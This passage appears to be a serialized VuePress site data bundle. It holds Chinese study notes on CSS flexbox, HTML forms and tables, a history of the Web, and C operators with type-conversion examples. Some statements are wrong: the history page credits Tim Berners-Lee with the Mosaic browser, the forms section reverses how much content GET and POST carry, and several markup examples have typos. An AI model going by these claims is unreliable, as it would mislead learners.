交叉轴的起点。\n * flex-end 交叉轴的终点\n * center 交叉轴的中点\n\n 5. align-content 子元素在交叉轴方向的对齐方式（适用于多根轴线）\n\n * flex-start 交叉轴的起点。\n * flex-end 交叉轴的终点\n * center 交叉轴的中点\n\n\n# 3. 项目（写在子元素身上）的属性\n\n1.order\n\norder 的值是整数，默认为0，整数越小，项目的排列越靠前， 2. flex-grow 父元素有多余的空间时，子元素是否放大。 默认值为0，即有多余的空间也不进行放大；可能的值为整数，表示放大的比例\n\n 3. flex-shrink\n\n父元素空间不足时，子元素是否缩小。默认值为1，即空间不足时，子元素会自动缩小。\n\n 4. flex-basis\n\n表示子元素在主轴上占据的空间，默认值为auto\n\n5.align-self 允许子元素有自己独特的在交叉轴上的对齐方式，默认值为auto\n\n * auto：和父元素在交叉轴上的值一致。\n * flex-start： 顶端对齐\n * flex-end：底部对齐\n * center：竖直方向上居中对齐。\n * baseline： 子元素第一行文字的底部对齐\n * stretch：当子元素未设置高度时，子元素将和父元素登高对齐。\n\n\n# 十四、表单from\n\n 1. 作用\n\n> 通过表单，浏览器能从web服务器中获取信息，而且还能向web服务器反馈信息。\n\n 2. form 表单标签\n\n * action 内容提交的位置 php sap jsp\n\n * method 提交的方式\n   \n   get不安全 内容多 post 安全 内容少\n\n<form action="aa.php" method="post" enctype="multipart/from-data<from>\n\n\n 3. 表单控件\n\n（1）输入框\n\n<input type="text" placeholder="输入默认提示内容" maxlength="10" name="username">\n\n\nplaceholder:\n\nsize: 输入框的长度\n\nvalue：指定默认值\n\nmaxlength：输入最多的字符数\n\nname：和后台进行数据交互的，用于数据库获取信息\n\nreadonly：只读\n\ndisabled：禁用\n\ntype: 控件类型\n\n（2） 密码框\n\n<input type="password" name="psd">\n\n\n(3) 单选按钮（name值相同实现单选）\n\n 男<input type="radio" name="sex">\n 女<input type="radio" name="sex">\n\n\n(4)复选框\n\n 默认选择：checked\n 篮球<input type="checkbox" name="hobby" checkend>\n 学习\n <input type="checkbox" name="hobby">\n 唱歌\n <input type="checkbox" name="hobby" 跳舞 <input type="checkbox" name="hobby"\n\n\n(5) 下拉框\n\n <select name="" id="" multiple size="2">\n     <option value="" selected>学士</option>\n     <option value="">学士</option>\n     <option value="">学士</option>\n     <option value="">学士</option>\n     <option value="">学士</option>\n     <option value="">学士</option>\n </select>\n\n\nsize 控制option显示的个数\n\nmultiple 表示可以多选，按ctrl可以多选。默认单选\n\nvalue 属性的参数值是当该项被选中并提交后，web浏览器传送给服务器的数据。缺少时，浏览器将传送选项的内容。\n\nselected 用来指定选项的初始状态，表示该选项在初始时是被选中的。\n\n(6)上传文件\n\n<input type="file">\n\n\n(7)文本域\n\n<textarea name="" id="" cols="30" rows="10"><textarea>\n\n\n textarea {\n     禁止调整 resize：none； 默认的 resize：both； 垂直方向调整 resize：vertical； 水平方向调整 resize：horizontal；\n }\n\n\n(8)h5中的表单新功能\n\n 颜色板\n <input type="color">\n 邮箱\n <input type="email">\n 日期\n <input type="datetime-local">\n 数值\n <input type="number" max="10" min"1">\n 时间日期\n <input type="datetime-local">\n 搜索\n <input type="search">\n 时间\n <input type="time">\n\n\n(9)按钮\n\n 提交按钮\n <input type="submit">\n 重置按钮\n <input type="reset">\n 自定义按钮\n <input type="button" value="返回">\n <button>提交</button>\n\n\n 4. 获取焦点\n\n  input:focus {\n      outline: none;\n\n  }\n\n\n\n# 滚动条\n\n\n::-webkit-scrollbar {\n  /*滚动条整体样式*/\n  width: 10px; /*高宽分别对应横竖滚动条的尺寸*/\n  height: 6px;\n}\n::-webkit-scrollbar-thumb {\n  /*滚动条里面小方块*/\n  border-radius: 10px;\n  background-color: skyblue;\n  background-image: -webkit-linear-gradient(\n    45deg,\n    rgba(255, 255, 255, 0.2) 25%,\n    transparent 25%,\n    transparent 50%,\n    rgba(255, 255, 255, 0.2) 50%,\n    rgba(255, 255, 255, 0.2) 75%,\n    transparent 75%,\n    transparent\n  );\n}\n::-webkit-scrollbar-track {\n  /*滚动条里面轨道*/\n  box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.2);\n  background: #ededed;\n  border-radius: 10px;\n}\n\n\n\n# table\n\n\n <table>\n    <thead>\n        <tr>\n            <td>aaa</td>\n            <td>aaa</td>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td>aaa</td>\n            <td>aaa</td>\n        </tr>\n    </tbody>\n</table>\n\n为表格设置合并边框模型：\ntable\n  {\n  border-collapse:collapse;\n  }\n  \n规定相邻单元的边框之间的距离。使用 px、cm 等单位。不允许使用负值。\n如果定义一个 length 参数，那么定义的是水平和垂直间距。\n如果定义两个 length 参数，那么第一个设置水平间距，而第二个设置垂直间距。\nborder-spacing\n\n\n\n colspan和rowspan这两个属性用于创建特殊的表格。\n\ncolspan用来指定单元格横向跨越的列数：colspan就是合并列的，colspan=2的话就是合并两列。\n\nrowspan用来指定单元格纵向跨越的行数:rowspan就是用来合并行的，比如rowspan=2就是合并两行，\n\nrowspan通常使用在td和th标签中\nrow:行,span:跨度,跨距,范围\ncol:列,span:跨度,跨距,范围\n\n带有 thead、tbody 以及 tfoot 元素的 html 表格：\n<table border="1">\n  <thead>\n  \x3c!--头部--\x3e\n    <tr>\n      <th>month</th>\n      <th>savings</th>\n    </tr>\n  </thead>\n  <tbody>\n  \x3c!--中间--\x3e\n    <tr>\n      <td>january</td>\n      <td>$100</td>\n    </tr>\n    <tr>\n      <td>february</td>\n      <td>$80</td>\n    </tr>\n  </tbody>\n  <tfoot>\n  \x3c!--尾部--\x3e\n    <tr>\n      <td>sum</td>\n      <td>$180</td>\n    </tr>\n  </tfoot>\n</table>\n\n    \n\n\n  table {\n            border: 1px solid #aaaaab;\n            width: 100%;\n            background-color: #25242a;\n            max-width: 100%;\n            border-collapse: collapse;\n            border-spacing: 0;\n            font-size: 12px;\n            color: #aaaaab;\n            tr > td:nth-child(odd) {\n              width: 150px;\n            }\n            tr > td:nth-child(even) {\n              width: 450px;\n            }\n            td {\n              padding: 8px;\n              line-height: 1.42857;\n              vertical-align: top;\n              box-sizing: border-box;\n              color: #ddd;\n              border: 1px solid #aaaaab;\n            }\n          }\n\n\n\n# 容易混淆的几个css属性\n\n属性               含义\nanimation（动画）    用于设置动画属性，他是一个简写的属性，包含6个属性\ntransition（过渡）   用于设置元素的样式过度，和animation有着类似的效果，但细节上有很大的不同\ntransform（变形）    用于元素进行旋转、缩放、移动或倾斜，和设置样式的动画并没有什么关系，就相当于color一样用来设置元素的“外表”\ntranslate（移动）    translate只是transform的一个属性值，即移动。\n\nmysql> select user, host from mysql.user 转自中国存储网，原文链接：http://www.chinastor.com/yw/04293qk2018.html',charsets:{cjk:!0}},{title:"Web发展史",frontmatter:{},regularPath:"/web/",relativePath:"web/README.md",key:"v-34b7b872",path:"/web/",headers:[{level:2,title:"世界性的信息库",slug:"世界性的信息库",normalizedTitle:"世界性的信息库",charIndex:83},{level:2,title:"Web诞生",slug:"web诞生",normalizedTitle:"web诞生",charIndex:339},{level:3,title:"万维网",slug:"万维网",normalizedTitle:"万维网",charIndex:379},{level:3,title:"W3C",slug:"w3c",normalizedTitle:"w3c",charIndex:672},{level:3,title:"网页从学术机构走向公众社会",slug:"网页从学术机构走向公众社会",normalizedTitle:"网页从学术机构走向公众社会",charIndex:1212},{level:2,title:"Web社会影响",slug:"web社会影响",normalizedTitle:"web社会影响",charIndex:1435},{level:2,title:"Web行业的发展趋势",slug:"web行业的发展趋势",normalizedTitle:"web行业的发展趋势",charIndex:1692},{level:3,title:"Web行业的发展动力",slug:"web行业的发展动力",normalizedTitle:"web行业的发展动力",charIndex:1707},{level:3,title:"H5 就是一个最好的例子",slug:"h5-就是一个最好的例子",normalizedTitle:"h5 就是一个最好的例子",charIndex:1848},{level:3,title:"未来软件的特点",slug:"未来软件的特点",normalizedTitle:"未来软件的特点",charIndex:1998},{level:3,title:"未来只有两种软件工程师",slug:"未来只有两种软件工程师",normalizedTitle:"未来只有两种软件工程师",charIndex:2079}],headersStr:"世界性的信息库 Web诞生 万维网 W3C 网页从学术机构走向公众社会 Web社会影响 Web行业的发展趋势 Web行业的发展动力 H5 就是一个最好的例子 未来软件的特点 未来只有两种软件工程师",content:"# Web发展史\n\n> 读史以明鉴,知古以鉴今!\n\n时至今日，Web发展从有到无，从简到繁，随着时间的推移，Web发展也越来越快，对于人类的影响也越来越大！\n\n\n# 世界性的信息库\n\n20世纪40年代以来，人们就梦想能拥有一个世界性的信息库。在这个信息库中，信息不仅能被全球的人们存取，而且能轻松地链接到其他地方的信息，使用户可以方便快捷地获得重要的信息。\n\nGopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，但在WWW出现后，Gopher失去了昔日的辉煌。\n\n\n# Web诞生\n\n> 1990年可以看做Web开发历史的起点。\n\n * 1990年，万维网之父蒂姆·伯纳斯·李（Tim Berners-Lee）开发出了第一个网页浏览器Mosaic，随即很多出色的程序员加入了网页浏览器开发的行列；\n * 1991年8月6日，由蒂姆·伯纳斯·李建立的全世界第一个万维网网站上线。\n * 1993年4月30日，欧洲核子研究组织宣布万维网对任何人免费开放，并不收取任何费用。两个月之后Gopher宣布不再免费，造成大量用户从Gopher转向万维网。\n * 1994年10月13日，网景公司开发的浏览器Mosaic Netscape 0.9发布；\n * 1994年10月，蒂姆·伯纳斯·李(Tim Berners-Lee) 成立万维网联盟，又称W3C理事会(W3C 致力于对web 进行标准化)。\n\n\n# 万维网\n\n蒂姆·伯纳斯·李发明了他发明了World Wide Web(WWW)。\n\n在1990年圣诞假期，伯纳斯·李制作了要一个网络工作所必须的所有工具：第一个万维网浏览器（同时也是编辑器）和第一个网页服务器。\n\nWWW可以让Web客户端（常用浏览器）访问浏览Web服务器上的页面。 是一个由许多互相链接的超文本组成的系统，通过互联网访问。\n\n\n> 他并没有为“WWW”申请专利或限制它的使用，而是无偿的向全世界开放。如果给万维网申请专利，他将成为物质上最富有的人。\n\n\n# W3C\n\n万维网（World Wide Web）是作为欧洲核子研究组织的一个项目发展起来的，在那里 Tim Berners-Lee 开发出万维网的雏形。Tim Berners-Lee- 万维网的发明人和万维网联盟的主任。\n\n万维网联盟，又称W3C理事会。1994年10月在麻省理工学院计算机科学实验室成立。建立者是万维网的发明者蒂姆·伯纳斯·李。\n\nW3C 最重要的工作是发展 Web 规范（称为推荐，Recommendations），这些规范描述了 Web 的通信协议（比如 HTML 和 XHTML、CSS等）和其他的构建模块。\n\n\n# 网页从学术机构走向公众社会\n\n万维网（WWW）是欧洲核子研究组织的科学家为了方便看文档、传递论文而创造的，这就是为什么Web网页都基于Document。Document就是用标记语言+超链接写成的由文字和图片构成的HTML页面，这样的功能已经完全满足学术交流的需要，所以网页的早期形态和Document一样，完全基于HTML页面，并且所有内容都是静态的。\n\n随着网页从学术机构走向公众社会，网页承载的功能便超出了学术范围而变得愈加丰富。\n\n\n# Web社会影响\n\n万维网使得全世界的人们以史无前例的巨大规模相互交流。相距遥远的人们，甚至是不同年代的人们可以通过网络来发展亲密的关系或者使彼此思想境界得到升华，甚至改变他们对待小事的态度以及精神。情感经历、政治观点、文化习惯、表达方式、商业建议、艺术、摄影、文学都可以以人类历史上从来没有过的低投入实现数据共享。\n\n万维网是人类历史上最深远、最广泛的传播媒介。它可以使它的用户可以和分散于这个行星上不同时空的其他人群相互联系，其人数远远超过通过具体接触或其他所有已经存在的通讯媒介的总和所能达到的数目。\n\n\n# Web行业的发展趋势\n\n\n# Web行业的发展动力\n\n历史演变\n\n前后端不分 -> 前后端分离 -> 全栈工程师\n\n演变动力\n\n更加产业化、大规模地生产软件\n\n效率更高\n\n成本更低\n\n通用性好、能够快速产出的技术最终会赢，单个程序员的生产力要求越来越高，程序员只有向全栈进化才能满足越来越高的工作要求。\n\n\n# H5 就是一个最好的例子\n\n为什么 H5 技术会赢得移动端？开发速度快：原生app 需要重新编译才能看到结果，H5 是即时输出。开发成本低：原生app 需要两个开发团队，H5 只要一个团队\n\n快速发布：安卓 Native 新版本需要24小时，iOS 需要 3 ～ 4 天，H5 可以随时更新\n\n\n# 未来软件的特点\n\n * 联网\n * 高并发\n * 分布式\n * 跨终端\n\n现在基于 Web 的前端技术，将演变为未来所有软件的通用的 GUI 解决方案。\n\n\n# 未来只有两种软件工程师\n\n * 端工程师\n   * 手机端\n   * PC 端\n   * TV 端\n   * VR 端\n   * ……\n * 云工程师",normalizedContent:"# web发展史\n\n> 读史以明鉴,知古以鉴今!\n\n时至今日，web发展从有到无，从简到繁，随着时间的推移，web发展也越来越快，对于人类的影响也越来越大！\n\n\n# 世界性的信息库\n\n20世纪40年代以来，人们就梦想能拥有一个世界性的信息库。在这个信息库中，信息不仅能被全球的人们存取，而且能轻松地链接到其他地方的信息，使用户可以方便快捷地获得重要的信息。\n\ngopher是internet上一个非常有名的信息查找系统，它将internet上的文件组织成某种索引，很方便地将用户从internet的一处带到另一处。在www出现之前，gopher是internet上最主要的信息检索工具，gopher站点也是最主要的站点，但在www出现后，gopher失去了昔日的辉煌。\n\n\n# web诞生\n\n> 1990年可以看做web开发历史的起点。\n\n * 1990年，万维网之父蒂姆·伯纳斯·李（tim berners-lee）开发出了第一个网页浏览器mosaic，随即很多出色的程序员加入了网页浏览器开发的行列；\n * 1991年8月6日，由蒂姆·伯纳斯·李建立的全世界第一个万维网网站上线。\n * 1993年4月30日，欧洲核子研究组织宣布万维网对任何人免费开放，并不收取任何费用。两个月之后gopher宣布不再免费，造成大量用户从gopher转向万维网。\n * 1994年10月13日，网景公司开发的浏览器mosaic netscape 0.9发布；\n * 1994年10月，蒂姆·伯纳斯·李(tim berners-lee) 成立万维网联盟，又称w3c理事会(w3c 致力于对web 进行标准化)。\n\n\n# 万维网\n\n蒂姆·伯纳斯·李发明了他发明了world wide web(www)。\n\n在1990年圣诞假期，伯纳斯·李制作了要一个网络工作所必须的所有工具：第一个万维网浏览器（同时也是编辑器）和第一个网页服务器。\n\nwww可以让web客户端（常用浏览器）访问浏览web服务器上的页面。 是一个由许多互相链接的超文本组成的系统，通过互联网访问。\n\n\n> 他并没有为“www”申请专利或限制它的使用，而是无偿的向全世界开放。如果给万维网申请专利，他将成为物质上最富有的人。\n\n\n# w3c\n\n万维网（world wide web）是作为欧洲核子研究组织的一个项目发展起来的，在那里 tim berners-lee 开发出万维网的雏形。tim berners-lee- 万维网的发明人和万维网联盟的主任。\n\n万维网联盟，又称w3c理事会。1994年10月在麻省理工学院计算机科学实验室成立。建立者是万维网的发明者蒂姆·伯纳斯·李。\n\nw3c 最重要的工作是发展 web 规范（称为推荐，recommendations），这些规范描述了 web 的通信协议（比如 html 和 xhtml、css等）和其他的构建模块。\n\n\n# 网页从学术机构走向公众社会\n\n万维网（www）是欧洲核子研究组织的科学家为了方便看文档、传递论文而创造的，这就是为什么web网页都基于document。document就是用标记语言+超链接写成的由文字和图片构成的html页面，这样的功能已经完全满足学术交流的需要，所以网页的早期形态和document一样，完全基于html页面，并且所有内容都是静态的。\n\n随着网页从学术机构走向公众社会，网页承载的功能便超出了学术范围而变得愈加丰富。\n\n\n# web社会影响\n\n万维网使得全世界的人们以史无前例的巨大规模相互交流。相距遥远的人们，甚至是不同年代的人们可以通过网络来发展亲密的关系或者使彼此思想境界得到升华，甚至改变他们对待小事的态度以及精神。情感经历、政治观点、文化习惯、表达方式、商业建议、艺术、摄影、文学都可以以人类历史上从来没有过的低投入实现数据共享。\n\n万维网是人类历史上最深远、最广泛的传播媒介。它可以使它的用户可以和分散于这个行星上不同时空的其他人群相互联系，其人数远远超过通过具体接触或其他所有已经存在的通讯媒介的总和所能达到的数目。\n\n\n# web行业的发展趋势\n\n\n# web行业的发展动力\n\n历史演变\n\n前后端不分 -> 前后端分离 -> 全栈工程师\n\n演变动力\n\n更加产业化、大规模地生产软件\n\n效率更高\n\n成本更低\n\n通用性好、能够快速产出的技术最终会赢，单个程序员的生产力要求越来越高，程序员只有向全栈进化才能满足越来越高的工作要求。\n\n\n# h5 就是一个最好的例子\n\n为什么 h5 技术会赢得移动端？开发速度快：原生app 需要重新编译才能看到结果，h5 是即时输出。开发成本低：原生app 需要两个开发团队，h5 只要一个团队\n\n快速发布：安卓 native 新版本需要24小时，ios 需要 3 ～ 4 天，h5 可以随时更新\n\n\n# 未来软件的特点\n\n * 联网\n * 高并发\n * 分布式\n * 跨终端\n\n现在基于 web 的前端技术，将演变为未来所有软件的通用的 gui 解决方案。\n\n\n# 未来只有两种软件工程师\n\n * 端工程师\n   * 手机端\n   * pc 端\n   * tv 端\n   * vr 端\n   * ……\n * 云工程师",charsets:{cjk:!0}},{title:"运算符与表达式",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/01-%E8%BF%90%E7%AE%97%E7%AC%A6%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F.html",relativePath:"数据结构/C语言程序设计/01-运算符与表达式.md",key:"v-be053fec",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/01-%E8%BF%90%E7%AE%97%E7%AC%A6%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F.html",headers:[{level:2,title:"运算符与表达式",slug:"运算符与表达式",normalizedTitle:"运算符与表达式",charIndex:2},{level:2,title:"运算符",slug:"运算符",normalizedTitle:"运算符",charIndex:2},{level:2,title:"算术运算符",slug:"算术运算符",normalizedTitle:"算术运算符",charIndex:34},{level:2,title:"赋值运算符",slug:"赋值运算符",normalizedTitle:"赋值运算符",charIndex:118},{level:2,title:"比较运算符",slug:"比较运算符",normalizedTitle:"比较运算符",charIndex:634},{level:2,title:"逻辑运算符",slug:"逻辑运算符",normalizedTitle:"逻辑运算符",charIndex:76},{level:2,title:"运算符优先级",slug:"运算符优先级",normalizedTitle:"运算符优先级",charIndex:996},{level:2,title:"类型转换",slug:"类型转换",normalizedTitle:"类型转换",charIndex:1678},{level:3,title:"隐式类型转换",slug:"隐式类型转换",normalizedTitle:"隐式类型转换",charIndex:3429},{level:3,title:"强制类型转换",slug:"强制类型转换",normalizedTitle:"强制类型转换",charIndex:1676}],headersStr:"运算符与表达式 运算符 算术运算符 赋值运算符 比较运算符 逻辑运算符 运算符优先级 类型转换 隐式类型转换 强制类型转换",content:'# 运算符与表达式\n\n\n# 运算符\n\n运算符类型       作用\n算术运算符       用于处理四则运算\n关系运算符       用于处理大小关系\n逻辑运算符       用于处理逻辑关系\n位运算符        用于处理二进制位\n赋值运算符       用于赋值\nsizeof运算符   用于获取变量或类型的长度\n\n\n# 算术运算符\n\n运算符   术语   举例        结果\n+     正号   +a        a\n-     负号   -a        -a\n+     加法   a+b       a与b的和\n-     减法   a-b       a与b的差\n*     乘法   a*b       a与b的积\n/     除法   a/b       a与b的商\n%     取余   a%b       a除以b的余数\n++    自增   a++或++a   a自增1\n--    自减   a--或--a   a自减1\n\n\n# 赋值运算符\n\n运算符   术语      举例     结果\n=     赋值      a=b    将b的值赋给a\n+=    加后赋值    a+=b   a=a+b\n-=    减后赋值    a-=b   a=a-b\n*=    乘后赋值    a*=b   a=a*b\n/=    除后赋值    a/=b   a=a/b\n%=    取余后赋值   a%=b   a=a%b\n\n\n# 比较运算符\n\n> c语言中，比较运算符的结果只有两种：真（非0）或假（0）。\n\n运算符   术语     举例     结果\n>     大于     a>b    a是否大于b\n>=    大于等于   a>=b   a是否大于等于b\n<     小于     a<b    a是否小于b\n<=    小于等于   a<=b   a是否小于等于b\n==    等于     a==b   a是否等于b\n!=    不等于    a!=b   a是否不等于b\n\n\n# 逻辑运算符\n\n运算符   术语    举例     结果\n&&    逻辑与   a&&b   a和b都为真时，结果为真\n||    逻辑或   a||b   a和b有一个为真时，结果为真\n!     逻辑非   !a     a为假时，结果为真\n\n\n# 运算符优先级\n\n优先级   运算符      名称        使用形式        结合方向   说明\n1     []       数组下标      a[5]        从左到右   数组a的第5个元素\n1     ()       圆括号       a(5)        从左到右   函数a的第5个参数\n1     ->       结构体指针成员   a->b        从左到右   结构体指针a的成员b\n1     .        结构体成员     a.b         从左到右   结构体a的成员b\n2     !        逻辑非       !a          从右到左   逻辑非a\n2     ~        按位取反      ~a          从右到左   按位取反a\n2     ++       自增        ++a         从右到左   a自增1\n2     --       自减        --a         从右到左   a自减1\n2     +        正号        +a          从右到左   正号a\n2     -        负号        -a          从右到左   负号a\n2     *        取值        *a          从右到左   指针a指向的值\n2     &        取地址       &a          从右到左   a的地址\n2     (类型)     强制类型转换    (int)a      从右到左   将a转换为int类型\n2     sizeof   取长度       sizeof(a)   从右到左   a的长度\n3     *        乘法        a*b         从左到右   a与b的积\n3     /        除法        a/b         从左到右   a与b的商\n3     %        取余        a%b         从左到右   a除以b的余数\n4     +        加法        a+b         从左到右   a与b的和\n4     -        减法        a-b         从左到右   a与b的差\n5     <<       左移        a<<b        从左到右   a左移b位\n5     >>       右移        a>>b        从左到右   a右移b位\n6     <        小于        a<b         从左到右   a是否小于b\n6     <=       小于等于      a<=b        从左到右   a是否小于等于b\n6     >        大于        a>b         从左到右   a是否大于b\n6     >=       大于等于      a>=b        从左到右   a是否大于等于b\n7     ==       等于        a==b        从左到右   a是否等于b\n7     !=       不等于       a!=b        从左到右   a是否不等于b\n8     &        按位与       a&b         从左到右   a与b按位与\n9     ^        按位异或      a^b         从左到右   a与b按位异或\n10    \\|       按位或       a|b         从左到右   a与b按位或\n11    &&       逻辑与       a&&b        从左到右   a和b都为真时，结果为真\n12    \\|\\|     逻辑或       a||b        从左到右   a和b有一个为真时，结果为真\n13    ?:       条件运算符     a?b:c       从右到左   如果a为真，结果为b，否则结果为c\n14    =        赋值        a=b         从右到左   将b的值赋给a\n14    +=       加后赋值      a+=b        从右到左   a=a+b\n14    -=       减后赋值      a-=b        从右到左   a=a-b\n14    *=       乘后赋值      a*=b        从右到左   a=a*b\n14    /=       除后赋值      a/=b        从右到左   a=a/b\n14    %=       取余后赋值     a%=b        从右到左   a=a%b\n14    <<=      左移后赋值     a<<=b       从右到左   a=a<<b\n14    >>=      右移后赋值     a>>=b       从右到左   a=a>>b\n14    &=       按位与后赋值    a&=b        从右到左   a=a&b\n14    ^=       按位异或后赋值   a^=b        从右到左   a=a^b\n14    \\|=      按位或后赋值    a|=b        从右到左   a=a|b\n15    ,        逗号        a, b        从左到右   先计算a，再计算b，结果为b\n\n\n# 类型转换\n\n> 有时候，我们需要将一个类型的变量转换为另一个类型的变量，这就需要用到类型转换。\n\n * 隐式类型转换：在程序运行过程中，编译器自动进行的类型转换。\n * 强制类型转换：在程序运行过程中，由程序员手动进行的类型转换。\n\n\n# 隐式类型转换\n\n> 隐式类型转换是在程序运行过程中，编译器自动进行的类型转换。\n\n * 当一个表达式中包含不同类型的变量时，编译器会自动将低类型转换为高类型，然后再进行运算。\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10;\n    double b = 3.14;\n    double c = a + b;\n\n    printf("c = %lf\\n", c);\n\n    return 0;\n}\n\n\n\n# 强制类型转换\n\n> 强制类型转换是在程序运行过程中，由程序员手动进行的类型转换。\n\n * 强制类型转换的语法格式：(type)expression ，其中，type表示要转换的类型，expression表示要转换的表达式。\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10;\n    double b = 3.14;\n    int c = (int)(a + b);\n\n    printf("c = %d\\n", c);\n\n    return 0;\n\n}\n',normalizedContent:'# 运算符与表达式\n\n\n# 运算符\n\n运算符类型       作用\n算术运算符       用于处理四则运算\n关系运算符       用于处理大小关系\n逻辑运算符       用于处理逻辑关系\n位运算符        用于处理二进制位\n赋值运算符       用于赋值\nsizeof运算符   用于获取变量或类型的长度\n\n\n# 算术运算符\n\n运算符   术语   举例        结果\n+     正号   +a        a\n-     负号   -a        -a\n+     加法   a+b       a与b的和\n-     减法   a-b       a与b的差\n*     乘法   a*b       a与b的积\n/     除法   a/b       a与b的商\n%     取余   a%b       a除以b的余数\n++    自增   a++或++a   a自增1\n--    自减   a--或--a   a自减1\n\n\n# 赋值运算符\n\n运算符   术语      举例     结果\n=     赋值      a=b    将b的值赋给a\n+=    加后赋值    a+=b   a=a+b\n-=    减后赋值    a-=b   a=a-b\n*=    乘后赋值    a*=b   a=a*b\n/=    除后赋值    a/=b   a=a/b\n%=    取余后赋值   a%=b   a=a%b\n\n\n# 比较运算符\n\n> c语言中，比较运算符的结果只有两种：真（非0）或假（0）。\n\n运算符   术语     举例     结果\n>     大于     a>b    a是否大于b\n>=    大于等于   a>=b   a是否大于等于b\n<     小于     a<b    a是否小于b\n<=    小于等于   a<=b   a是否小于等于b\n==    等于     a==b   a是否等于b\n!=    不等于    a!=b   a是否不等于b\n\n\n# 逻辑运算符\n\n运算符   术语    举例     结果\n&&    逻辑与   a&&b   a和b都为真时，结果为真\n||    逻辑或   a||b   a和b有一个为真时，结果为真\n!     逻辑非   !a     a为假时，结果为真\n\n\n# 运算符优先级\n\n优先级   运算符      名称        使用形式        结合方向   说明\n1     []       数组下标      a[5]        从左到右   数组a的第5个元素\n1     ()       圆括号       a(5)        从左到右   函数a的第5个参数\n1     ->       结构体指针成员   a->b        从左到右   结构体指针a的成员b\n1     .        结构体成员     a.b         从左到右   结构体a的成员b\n2     !        逻辑非       !a          从右到左   逻辑非a\n2     ~        按位取反      ~a          从右到左   按位取反a\n2     ++       自增        ++a         从右到左   a自增1\n2     --       自减        --a         从右到左   a自减1\n2     +        正号        +a          从右到左   正号a\n2     -        负号        -a          从右到左   负号a\n2     *        取值        *a          从右到左   指针a指向的值\n2     &        取地址       &a          从右到左   a的地址\n2     (类型)     强制类型转换    (int)a      从右到左   将a转换为int类型\n2     sizeof   取长度       sizeof(a)   从右到左   a的长度\n3     *        乘法        a*b         从左到右   a与b的积\n3     /        除法        a/b         从左到右   a与b的商\n3     %        取余        a%b         从左到右   a除以b的余数\n4     +        加法        a+b         从左到右   a与b的和\n4     -        减法        a-b         从左到右   a与b的差\n5     <<       左移        a<<b        从左到右   a左移b位\n5     >>       右移        a>>b        从左到右   a右移b位\n6     <        小于        a<b         从左到右   a是否小于b\n6     <=       小于等于      a<=b        从左到右   a是否小于等于b\n6     >        大于        a>b         从左到右   a是否大于b\n6     >=       大于等于      a>=b        从左到右   a是否大于等于b\n7     ==       等于        a==b        从左到右   a是否等于b\n7     !=       不等于       a!=b        从左到右   a是否不等于b\n8     &        按位与       a&b         从左到右   a与b按位与\n9     ^        按位异或      a^b         从左到右   a与b按位异或\n10    \\|       按位或       a|b         从左到右   a与b按位或\n11    &&       逻辑与       a&&b        从左到右   a和b都为真时，结果为真\n12    \\|\\|     逻辑或       a||b        从左到右   a和b有一个为真时，结果为真\n13    ?:       条件运算符     a?b:c       从右到左   如果a为真，结果为b，否则结果为c\n14    =        赋值        a=b         从右到左   将b的值赋给a\n14    +=       加后赋值      a+=b        从右到左   a=a+b\n14    -=       减后赋值      a-=b        从右到左   a=a-b\n14    *=       乘后赋值      a*=b        从右到左   a=a*b\n14    /=       除后赋值      a/=b        从右到左   a=a/b\n14    %=       取余后赋值     a%=b        从右到左   a=a%b\n14    <<=      左移后赋值     a<<=b       从右到左   a=a<<b\n14    >>=      右移后赋值     a>>=b       从右到左   a=a>>b\n14    &=       按位与后赋值    a&=b        从右到左   a=a&b\n14    ^=       按位异或后赋值   a^=b        从右到左   a=a^b\n14    \\|=      按位或后赋值    a|=b        从右到左   a=a|b\n15    ,        逗号        a, b        从左到右   先计算a，再计算b，结果为b\n\n\n# 类型转换\n\n> 有时候，我们需要将一个类型的变量转换为另一个类型的变量，这就需要用到类型转换。\n\n * 隐式类型转换：在程序运行过程中，编译器自动进行的类型转换。\n * 强制类型转换：在程序运行过程中，由程序员手动进行的类型转换。\n\n\n# 隐式类型转换\n\n> 隐式类型转换是在程序运行过程中，编译器自动进行的类型转换。\n\n * 当一个表达式中包含不同类型的变量时，编译器会自动将低类型转换为高类型，然后再进行运算。\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10;\n    double b = 3.14;\n    double c = a + b;\n\n    printf("c = %lf\\n", c);\n\n    return 0;\n}\n\n\n\n# 强制类型转换\n\n> 强制类型转换是在程序运行过程中，由程序员手动进行的类型转换。\n\n * 强制类型转换的语法格式：(type)expression ，其中，type表示要转换的类型，expression表示要转换的表达式。\n\n#include <stdio.h>\n\nint main() {\n\n    int a = 10;\n    double b = 3.14;\n    int c = (int)(a + b);\n\n    printf("c = %d\\n", c);\n\n    return 0;\n\n}\n',charsets:{cjk:!0}},{title:"常量与变量",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/00-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html",relativePath:"数据结构/C语言程序设计/00-数据类型.md",key:"v-4216b4c1",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/00-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html",headers:[{level:2,title:"常量与变量",slug:"常量与变量",normalizedTitle:"常量与变量",charIndex:2},{level:3,title:"关键字",slug:"关键字",normalizedTitle:"关键字",charIndex:12},{level:3,title:"数据类型",slug:"数据类型",normalizedTitle:"数据类型",charIndex:34},{level:3,title:"常量",slug:"常量",normalizedTitle:"常量",charIndex:2},{level:3,title:"变